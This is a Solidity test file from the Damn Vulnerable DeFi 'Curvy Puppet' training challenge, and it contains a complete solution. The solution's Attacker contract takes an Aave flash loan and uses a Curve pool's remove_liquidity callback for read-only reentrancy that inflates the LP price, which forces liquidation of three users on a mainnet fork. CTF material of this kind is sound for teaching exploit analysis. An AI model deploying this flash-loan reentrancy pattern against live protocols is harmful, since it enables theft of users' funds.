// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import { Test, console } from "forge-std/Test.sol";
import { IPermit2 } from "permit2/interfaces/IPermit2.sol";
import { WETH } from "solmate/tokens/WETH.sol";
import { DamnValuableToken } from "../../src/DamnValuableToken.sol";
import { CurvyPuppetLending, IERC20 } from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import { CurvyPuppetOracle } from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import { IStableSwap } from "../../src/curvy-puppet/IStableSwap.sol";

// https://docs.aave.com/developers/core-contracts/pool#flashloansimple
interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IWstETH is IERC20 {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
}

interface IFlashLoanReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract Attacker is IFlashLoanReceiver {
    uint256 constant USER_BORROW_AMOUNT = 1e18 * 3;
    IPermit2 constant permit2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool =
        IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 lpToken = IERC20(curvePool.lp_token());
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    // https://github.com/bgd-labs/aave-address-book/blob/1ff54b29e620ce40723c2fc9e821ee8afb448140/src/AaveV3Ethereum.sol#L142C29-L142C35
    IWstETH constant wstETH =
        IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    WETH constant weth =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    // https://docs.aave.com/developers/deployed-contracts/v3-mainnet/ethereum-mainnet
    IAavePool constant aavePool =
        IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    address treasury;
    address[3] users;

    constructor(
        DamnValuableToken _dvt,
        CurvyPuppetLending _lending,
        address _treasury,
        address[3] memory _users
    ) {
        dvt = _dvt;
        lending = _lending;
        treasury = _treasury;
        users = _users;
    }

    receive() external payable {
        if (msg.sender == address(weth)) {
            return;
        }
        if (msg.sender == address(curvePool)) {
            console.log(
                "virtual price when callback",
                curvePool.get_virtual_price()
            );
            require(
                lpToken.balanceOf(address(this)) > USER_BORROW_AMOUNT,
                "not enough lp token to liquidate"
            );
            lpToken.approve(address(permit2), USER_BORROW_AMOUNT);
            permit2.approve(
                address(lpToken),
                address(lending),
                uint160(USER_BORROW_AMOUNT),
                uint48(block.timestamp)
            );

            lending.liquidate(users[0]);
            lending.liquidate(users[1]);
            lending.liquidate(users[2]);
        }
    }

    function recovery() external {
        aavePool.flashLoanSimple(
            address(this),
            address(wstETH),
            200000 ether,
            "",
            0
        );
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        console.log("into execute operation");
        require(msg.sender == address(aavePool), "not from aave pool");
        require(asset == address(wstETH), "not wstETH");
        require(initiator == address(this), "not from attacker");

        uint256 stETHBalance = wstETH.unwrap(wstETH.balanceOf(address(this)));

        // play liquidity
        weth.withdraw(weth.balanceOf(address(this)));
        stETH.approve(address(curvePool), type(uint256).max);
        curvePool.add_liquidity{ value: address(this).balance }({
            amounts: [address(this).balance, stETHBalance],
            min_mint_amount: 0
        });
        console.log(
            "virtual price before remove_liquidity:",
            curvePool.get_virtual_price()
        );
        uint256 lpAmount = lpToken.balanceOf(address(this)) -
            USER_BORROW_AMOUNT;
        curvePool.remove_liquidity_imbalance({
            _amounts: [
                1 wei, // enable callback to attacker
                curvePool.calc_withdraw_one_coin(lpAmount, 1) - 1
            ],
            _max_burn_amount: lpAmount
        });
        console.log(
            "virtual price after remove_liquidity:",
            curvePool.get_virtual_price()
        );

        uint256 payback = amount + premium;
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(
            wstETH.balanceOf(address(this)) > payback,
            "not enough payback wstETH"
        );
        wstETH.approve(msg.sender, payback);
        return true;
    }
}

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 =
        IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool =
        IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022); // <ETH, stETH>
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth =
        WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({
            asset: ETH,
            value: ETHER_PRICE,
            expiration: block.timestamp + 1 days
        });
        oracle.setPrice({
            asset: address(dvt),
            value: DVT_PRICE,
            expiration: block.timestamp + 1 days
        });

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(
            address(lending),
            LENDER_INITIAL_LP_BALANCE
        );
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(
            IERC20(curvePool.lp_token()).balanceOf(treasury),
            TREASURY_LP_BALANCE
        );

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(
                lending.getCollateralValue(collateralAmount) /
                    lending.getBorrowValue(borrowAmount),
                3
            );
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(
            dvt,
            lending,
            treasury,
            [alice, bob, charlie]
        );
        // leave some weth to treasury
        weth.transferFrom(
            treasury,
            address(attacker),
            TREASURY_WETH_BALANCE - 10 ether
        );
        attacker.recovery();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(
                lending.getCollateralAmount(users[i]),
                0,
                "User position still has collateral assets"
            );
            assertEq(
                lending.getBorrowAmount(users[i]),
                0,
                "User position still has borrowed assets"
            );
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(
            IERC20(curvePool.lp_token()).balanceOf(treasury),
            0,
            "Treasury doesn't have any LP tokens left"
        );
        assertEq(
            dvt.balanceOf(treasury),
            USER_INITIAL_COLLATERAL_BALANCE * 3,
            "Treasury doesn't have the users' DVT"
        );

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(
            IERC20(curvePool.lp_token()).balanceOf(player),
            0,
            "Player still has LP tokens"
        );
    }
}
